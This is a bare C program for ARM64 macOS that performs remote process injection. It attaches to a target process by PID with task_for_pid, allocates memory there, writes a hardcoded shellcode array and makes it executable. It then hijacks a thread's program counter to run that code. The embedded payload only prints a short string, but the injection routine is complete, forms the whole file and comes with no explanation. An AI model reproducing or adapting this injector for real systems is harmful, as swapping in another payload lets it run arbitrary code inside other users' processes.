#include <stdio.h>
#include <stdlib.h>

#include <ptrauth.h>
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach/mach_vm.h>
#include <mach/arm/thread_status.h>

int
main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("need pid\n");
		return 0;
	}

	pid_t pid;
	pid = atoi(argv[1]);

	mach_port_t port_self;
	port_self = mach_task_self();

	task_t task;

	kern_return_t res;
	res = task_for_pid(port_self, pid, &task);
	if (res != KERN_SUCCESS) {
		printf("failed to attach, res: %u\n", res);
		return 0;
	}

	res = task_suspend(task);
	if (res != KERN_SUCCESS) {
		printf("failed to wait, res: %u\n", res);
		return 0;
	}

	static const unsigned int shl[] = {
		0xd2800090,
		0xd2800020,
		0x10000081,
		0xd2800082,
		0xd4001001,
		0xd65f03c0,
		0x0a636261,
	};

	mach_vm_address_t addr;
	addr = 0;
	res = mach_vm_allocate(task, &addr, sizeof (shl), VM_FLAGS_ANYWHERE);
	if (res != KERN_SUCCESS) {
		printf("failed to allocate a new page, res: %u, str: %s\n", res, mach_error_string(res));
		return 0;
	}

	printf("allocated a new remote page at %p\n", (void*)addr);

	res = mach_vm_write(task, addr, (vm_offset_t)shl, sizeof (shl));
	if (res != KERN_SUCCESS) {
		printf("failed to write the shellcode, res: %u, str: %s\n", res, mach_error_string(res));
		return 0;
	}

	res = mach_vm_protect(task, addr, sizeof (shl), 0, VM_PROT_READ | VM_PROT_EXECUTE);
	if (res != KERN_SUCCESS) {
		printf("failed to change remote protections, res: %u, str: %s\n", res, mach_error_string(res));
		return 0;
	}

	thread_act_port_array_t thds;
	mach_msg_type_number_t  tcnt;

	tcnt = 0;
	res = task_threads(task, &thds, &tcnt);
	if (res != KERN_SUCCESS) {
		printf("failed to get remote threads, res: %u\n", res);
		return 0;
	}

	printf("got %u number of threads\n", tcnt);

	size_t tidx;
	tidx = 0;

	if (tidx >= tcnt) {
		printf("the selected thread index is invalid\n");
		return 0;
	}

	mach_msg_type_number_t tsc;
	tsc = ARM_THREAD_STATE64_COUNT;

	arm_thread_state64_t tst;
	res = thread_get_state(thds[tidx], ARM_THREAD_STATE64, (thread_state_t)&tst, &tsc);
	if (res != KERN_SUCCESS) {
		printf("failed to get thread state, res: %u, str:%s\n", res, mach_error_string(res));
		return 0;
	}

	printf("old program counter: %016llx\n", tst.__pc);
	tst.__pc = addr;
	printf("new program counter: %016llx\n", tst.__pc);

	res = thread_set_state(thds[tidx], ARM_THREAD_STATE64, (thread_state_t)&tst, tsc);
	if (res != KERN_SUCCESS) {
		printf("failed to set the thread state, res: %u, str:%s\n", res, mach_error_string(res));
		return 0;
	}

	res = task_resume(task);
	if (res != KERN_SUCCESS) {
		printf("failed to resume the task, res: %u, str: %s\n", res, mach_error_string(res));
		return 0;
	}

	printf("exiting...\n");
	return 0;
}
